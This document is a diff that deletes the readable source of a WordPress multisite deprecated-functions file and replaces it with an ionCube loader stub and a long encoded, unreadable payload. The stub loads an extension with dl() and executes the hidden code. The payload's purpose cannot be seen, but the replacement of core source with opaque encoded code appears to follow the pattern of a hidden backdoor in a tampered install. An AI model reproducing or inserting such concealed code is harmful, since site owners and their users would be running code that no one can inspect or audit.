@@ -1,548 +1,248 @@
-<?php
-/**
- * Deprecated functions from WordPress MU and the multisite feature. You shouldn't
- * use these functions and look for the alternatives instead. The functions will be
- * removed in a later version.
- *
- * @package WordPress
- * @subpackage Deprecated
- * @since 3.0.0
- */
-
-/*
- * Deprecated functions come here to die.
- */
-
-/**
- * Get the "dashboard blog", the blog where users without a blog edit their profile data.
- * Dashboard blog functionality was removed in WordPress 3.1, replaced by the user admin.
- *
- * @since MU (3.0.0)
- * @deprecated 3.1.0 Use get_site()
- * @see get_site()
- *
- * @return WP_Site Current site object.
- */
-function get_dashboard_blog() {
-    _deprecated_function( __FUNCTION__, '3.1.0', 'get_site()' );
-    if ( $blog = get_site_option( 'dashboard_blog' ) ) {
-	    return get_site( $blog );
-    }
-
-    return get_site( get_network()->site_id );
-}
-
-/**
- * Generates a random password.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use wp_generate_password()
- * @see wp_generate_password()
- *
- * @param int $len Optional. The length of password to generate. Default 8.
- */
-function generate_random_password( $len = 8 ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'wp_generate_password()' );
-	return wp_generate_password( $len );
-}
-
-/**
- * Determine if user is a site admin.
- *
- * Plugins should use is_multisite() instead of checking if this function exists
- * to determine if multisite is enabled.
- *
- * This function must reside in a file included only if is_multisite() due to
- * legacy function_exists() checks to determine if multisite is enabled.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use is_super_admin()
- * @see is_super_admin()
- *
- * @param string $user_login Optional. Username for the user to check. Default empty.
- */
-function is_site_admin( $user_login = '' ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'is_super_admin()' );
-
-	if ( empty( $user_login ) ) {
-		$user_id = get_current_user_id();
-		if ( !$user_id )
-			return false;
-	} else {
-		$user = get_user_by( 'login', $user_login );
-		if ( ! $user->exists() )
-			return false;
-		$user_id = $user->ID;
-	}
-
-	return is_super_admin( $user_id );
-}
-
-if ( !function_exists( 'graceful_fail' ) ) :
-/**
- * Deprecated functionality to gracefully fail.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use wp_die()
- * @see wp_die()
- */
-function graceful_fail( $message ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'wp_die()' );
-	$message = apply_filters( 'graceful_fail', $message );
-	$message_template = apply_filters( 'graceful_fail_template',
-'<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml"><head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>Error!</title>
-<style type="text/css">
-img {
-	border: 0;
-}
-body {
-line-height: 1.6em; font-family: Georgia, serif; width: 390px; margin: auto;
-text-align: center;
-}
-.message {
-	font-size: 22px;
-	width: 350px;
-	margin: auto;
-}
-</style>
-</head>
-<body>
-<p class="message">%s</p>
-</body>
-</html>' );
-	die( sprintf( $message_template, $message ) );
-}
-endif;
-
-/**
- * Deprecated functionality to retrieve user information.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use get_user_by()
- * @see get_user_by()
- *
- * @param string $username Username.
- */
-function get_user_details( $username ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'get_user_by()' );
-	return get_user_by('login', $username);
-}
-
-/**
- * Deprecated functionality to clear the global post cache.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use clean_post_cache()
- * @see clean_post_cache()
- *
- * @param int $post_id Post ID.
- */
-function clear_global_post_cache( $post_id ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'clean_post_cache()' );
-}
-
-/**
- * Deprecated functionality to determin if the current site is the main site.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use is_main_site()
- * @see is_main_site()
- */
-function is_main_blog() {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'is_main_site()' );
-	return is_main_site();
-}
-
-/**
- * Deprecated functionality to validate an email address.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use is_email()
- * @see is_email()
- *
- * @param string $email        Email address to verify.
- * @param bool   $check_domain Deprecated.
- * @return string|bool Either false or the valid email address.
- */
-function validate_email( $email, $check_domain = true) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'is_email()' );
-	return is_email( $email, $check_domain );
-}
-
-/**
- * Deprecated functionality to retrieve a list of all sites.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0 Use wp_get_sites()
- * @see wp_get_sites()
- *
- * @param int    $start      Optional. Offset for retrieving the blog list. Default 0.
- * @param int    $num        Optional. Number of blogs to list. Default 10.
- * @param string $deprecated Unused.
- */
-function get_blog_list( $start = 0, $num = 10, $deprecated = '' ) {
-	_deprecated_function( __FUNCTION__, '3.0.0', 'wp_get_sites()' );
-
-	global $wpdb;
-	$blogs = $wpdb->get_results( $wpdb->prepare( "SELECT blog_id, domain, path FROM $wpdb->blogs WHERE site_id = %d AND public = '1' AND archived = '0' AND mature = '0' AND spam = '0' AND deleted = '0' ORDER BY registered DESC", get_current_network_id() ), ARRAY_A );
-
-	$blog_list = array();
-	foreach ( (array) $blogs as $details ) {
-		$blog_list[ $details['blog_id'] ] = $details;
-		$blog_list[ $details['blog_id'] ]['postcount'] = $wpdb->get_var( "SELECT COUNT(ID) FROM " . $wpdb->get_blog_prefix( $details['blog_id'] ). "posts WHERE post_status='publish' AND post_type='post'" );
-	}
-
-	if ( ! $blog_list ) {
-		return array();
-	}
-
-	if ( $num == 'all' ) {
-		return array_slice( $blog_list, $start, count( $blog_list ) );
-	} else {
-		return array_slice( $blog_list, $start, $num );
-	}
-}
-
-/**
- * Deprecated functionality to retrieve a list of the most active sites.
- *
- * @since MU (3.0.0)
- * @deprecated 3.0.0
- *
- * @param int  $num     Optional. Number of activate blogs to retrieve. Default 10.
- * @param bool $display Optional. Whether or not to display the most active blogs list. Default true.
- * @return array List of "most active" sites.
- */
-function get_most_active_blogs( $num = 10, $display = true ) {
-	_deprecated_function( __FUNCTION__, '3.0.0' );
-
-	$blogs = get_blog_list( 0, 'all', false ); // $blog_id -> $details
-	if ( is_array( $blogs ) ) {
-		reset( $blogs );
-		$most_active = array();
-		$blog_list = array();
-		foreach ( (array) $blogs as $key => $details ) {
-			$most_active[ $details['blog_id'] ] = $details['postcount'];
-			$blog_list[ $details['blog_id'] ] = $details; // array_slice() removes keys!!
-		}
-		arsort( $most_active );
-		reset( $most_active );
-		$t = array();
-		foreach ( (array) $most_active as $key => $details ) {
-			$t[ $key ] = $blog_list[ $key ];
-		}
-		unset( $most_active );
-		$most_active = $t;
-	}
-
-	if ( $display ) {
-		if ( is_array( $most_active ) ) {
-			reset( $most_active );
-			foreach ( (array) $most_active as $key => $details ) {
-				$url = esc_url('http://' . $details['domain'] . $details['path']);
-				echo '<li>' . $details['postcount'] . " <a href='$url'>$url</a></li>";
-			}
-		}
-	}
-	return array_slice( $most_active, 0, $num );
-}
-
-/**
- * Redirect a user based on $_GET or $_POST arguments.
- *
- * The function looks for redirect arguments in the following order:
- * 1) $_GET['ref']
- * 2) $_POST['ref']
- * 3) $_SERVER['HTTP_REFERER']
- * 4) $_GET['redirect']
- * 5) $_POST['redirect']
- * 6) $url
- *
- * @since MU (3.0.0)
- * @deprecated 3.3.0 Use wp_redirect()
- * @see wp_redirect()
- *
- * @param string $url Optional. Redirect URL. Default empty.
- */
-function wpmu_admin_do_redirect( $url = '' ) {
-	_deprecated_function( __FUNCTION__, '3.3.0', 'wp_redirect()' );
-
-	$ref = '';
-	if ( isset( $_GET['ref'] ) )
-		$ref = $_GET['ref'];
-	if ( isset( $_POST['ref'] ) )
-		$ref = $_POST['ref'];
-
-	if ( $ref ) {
-		$ref = wpmu_admin_redirect_add_updated_param( $ref );
-		wp_redirect( $ref );
-		exit();
-	}
-	if ( ! empty( $_SERVER['HTTP_REFERER'] ) ) {
-		wp_redirect( $_SERVER['HTTP_REFERER'] );
-		exit();
-	}
-
-	$url = wpmu_admin_redirect_add_updated_param( $url );
-	if ( isset( $_GET['redirect'] ) ) {
-		if ( substr( $_GET['redirect'], 0, 2 ) == 's_' )
-			$url .= '&action=blogs&s='. esc_html( substr( $_GET['redirect'], 2 ) );
-	} elseif ( isset( $_POST['redirect'] ) ) {
-		$url = wpmu_admin_redirect_add_updated_param( $_POST['redirect'] );
-	}
-	wp_redirect( $url );
-	exit();
-}
-
-/**
- * Adds an 'updated=true' argument to a URL.
- *
- * @since MU (3.0.0)
- * @deprecated 3.3.0 Use add_query_arg()
- * @see add_query_arg()
- *
- * @param string $url Optional. Redirect URL. Default empty.
- * @return string
- */
-function wpmu_admin_redirect_add_updated_param( $url = '' ) {
-	_deprecated_function( __FUNCTION__, '3.3.0', 'add_query_arg()' );
-
-	if ( strpos( $url, 'updated=true' ) === false ) {
-		if ( strpos( $url, '?' ) === false )
-			return $url . '?updated=true';
-		else
-			return $url . '&updated=true';
-	}
-	return $url;
-}
-
-/**
- * Get a numeric user ID from either an email address or a login.
- *
- * A numeric string is considered to be an existing user ID
- * and is simply returned as such.
- *
- * @since MU (3.0.0)
- * @deprecated 3.6.0 Use get_user_by()
- * @see get_user_by()
- *
- * @param string $string Either an email address or a login.
- * @return int
- */
-function get_user_id_from_string( $string ) {
-	_deprecated_function( __FUNCTION__, '3.6.0', 'get_user_by()' );
-
-	if ( is_email( $string ) )
-		$user = get_user_by( 'email', $string );
-	elseif ( is_numeric( $string ) )
-		return $string;
-	else
-		$user = get_user_by( 'login', $string );
-
-	if ( $user )
-		return $user->ID;
-	return 0;
-}
-
-/**
- * Get a full blog URL, given a domain and a path.
- *
- * @since MU (3.0.0)
- * @deprecated 3.7.0
- *
- * @param string $domain
- * @param string $path
- * @return string
- */
-function get_blogaddress_by_domain( $domain, $path ) {
-	_deprecated_function( __FUNCTION__, '3.7.0' );
-
-	if ( is_subdomain_install() ) {
-		$url = "http://" . $domain.$path;
-	} else {
-		if ( $domain != $_SERVER['HTTP_HOST'] ) {
-			$blogname = substr( $domain, 0, strpos( $domain, '.' ) );
-			$url = 'http://' . substr( $domain, strpos( $domain, '.' ) + 1 ) . $path;
-			// we're not installing the main blog
-			if ( $blogname != 'www.' )
-				$url .= $blogname . '/';
-		} else { // main blog
-			$url = 'http://' . $domain . $path;
-		}
-	}
-	return esc_url_raw( $url );
-}
-
-/**
- * Create an empty blog.
- *
- * @since MU (3.0.0)
- * @deprecated 4.4.0
- *
- * @param string $domain       The new blog's domain.
- * @param string $path         The new blog's path.
- * @param string $weblog_title The new blog's title.
- * @param int    $site_id      Optional. Defaults to 1.
- * @return string|int The ID of the newly created blog
- */
-function create_empty_blog( $domain, $path, $weblog_title, $site_id = 1 ) {
-	_deprecated_function( __FUNCTION__, '4.4.0' );
-
-	if ( empty($path) )
-		$path = '/';
-
-	// Check if the domain has been used already. We should return an error message.
-	if ( domain_exists($domain, $path, $site_id) )
-		return __( '<strong>ERROR</strong>: Site URL already taken.' );
-
-	// Need to back up wpdb table names, and create a new wp_blogs entry for new blog.
-	// Need to get blog_id from wp_blogs, and create new table names.
-	// Must restore table names at the end of function.
-
-	if ( ! $blog_id = insert_blog($domain, $path, $site_id) )
-		return __( '<strong>ERROR</strong>: problem creating site entry.' );
-
-	switch_to_blog($blog_id);
-	install_blog($blog_id);
-	restore_current_blog();
-
-	return $blog_id;
-}
-
-/**
- * Get the admin for a domain/path combination.
- *
- * @since MU (3.0.0)
- * @deprecated 4.4.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param string $domain Optional. Network domain.
- * @param string $path   Optional. Network path.
- * @return array|false The network admins.
- */
-function get_admin_users_for_domain( $domain = '', $path = '' ) {
-	_deprecated_function( __FUNCTION__, '4.4.0' );
-
-	global $wpdb;
-
-	if ( ! $domain ) {
-		$network_id = get_current_network_id();
-	} else {
-		$_networks  = get_networks( array(
-			'fields' => 'ids',
-			'number' => 1,
-			'domain' => $domain,
-			'path'   => $path,
-		) );
-		$network_id = ! empty( $_networks ) ? array_shift( $_networks ) : 0;
-	}
-
-	if ( $network_id )
-		return $wpdb->get_results( $wpdb->prepare( "SELECT u.ID, u.user_login, u.user_pass FROM $wpdb->users AS u, $wpdb->sitemeta AS sm WHERE sm.meta_key = 'admin_user_id' AND u.ID = sm.meta_value AND sm.site_id = %d", $network_id ), ARRAY_A );
-
-	return false;
-}
-
-/**
- * Return an array of sites for a network or networks.
- *
- * @since 3.7.0
- * @deprecated 4.6.0 Use get_sites()
- * @see get_sites()
- *
- * @param array $args {
- *     Array of default arguments. Optional.
- *
- *     @type int|array $network_id A network ID or array of network IDs. Set to null to retrieve sites
- *                                 from all networks. Defaults to current network ID.
- *     @type int       $public     Retrieve public or non-public sites. Default null, for any.
- *     @type int       $archived   Retrieve archived or non-archived sites. Default null, for any.
- *     @type int       $mature     Retrieve mature or non-mature sites. Default null, for any.
- *     @type int       $spam       Retrieve spam or non-spam sites. Default null, for any.
- *     @type int       $deleted    Retrieve deleted or non-deleted sites. Default null, for any.
- *     @type int       $limit      Number of sites to limit the query to. Default 100.
- *     @type int       $offset     Exclude the first x sites. Used in combination with the $limit parameter. Default 0.
- * }
- * @return array An empty array if the installation is considered "large" via wp_is_large_network(). Otherwise,
- *               an associative array of site data arrays, each containing the site (network) ID, blog ID,
- *               site domain and path, dates registered and modified, and the language ID. Also, boolean
- *               values for whether the site is public, archived, mature, spam, and/or deleted.
- */
-function wp_get_sites( $args = array() ) {
-	_deprecated_function( __FUNCTION__, '4.6.0', 'get_sites()' );
-
-	if ( wp_is_large_network() )
-		return array();
-
-	$defaults = array(
-		'network_id' => get_current_network_id(),
-		'public'     => null,
-		'archived'   => null,
-		'mature'     => null,
-		'spam'       => null,
-		'deleted'    => null,
-		'limit'      => 100,
-		'offset'     => 0,
-	);
-
-	$args = wp_parse_args( $args, $defaults );
-
-	// Backwards compatibility
-	if( is_array( $args['network_id'] ) ){
-		$args['network__in'] = $args['network_id'];
-		$args['network_id'] = null;
-	}
-
-	if( is_numeric( $args['limit'] ) ){
-		$args['number'] = $args['limit'];
-		$args['limit'] = null;
-	} elseif ( ! $args['limit'] ) {
-		$args['number'] = 0;
-		$args['limit'] = null;
-	}
-
-	// Make sure count is disabled.
-	$args['count'] = false;
-
-	$_sites  = get_sites( $args );
-
-	$results = array();
-
-	foreach ( $_sites as $_site ) {
-		$_site = get_site( $_site );
-		$results[] = $_site->to_array();
-	}
-
-	return $results;
-}
-
-/**
- * Check whether a usermeta key has to do with the current blog.
- *
- * @since MU (3.0.0)
- * @deprecated 4.9.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param string $key
- * @param int    $user_id Optional. Defaults to current user.
- * @param int    $blog_id Optional. Defaults to current blog.
- * @return bool
- */
-function is_user_option_local( $key, $user_id = 0, $blog_id = 0 ) {
-	global $wpdb;
-
-	_deprecated_function( __FUNCTION__, '4.9.0' );
-
-	$current_user = wp_get_current_user();
-	if ( $blog_id == 0 ) {
-		$blog_id = get_current_blog_id();
-	}
-	$local_key = $wpdb->get_blog_prefix( $blog_id ) . $key;
-
-	return isset( $current_user->$local_key );
-}
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
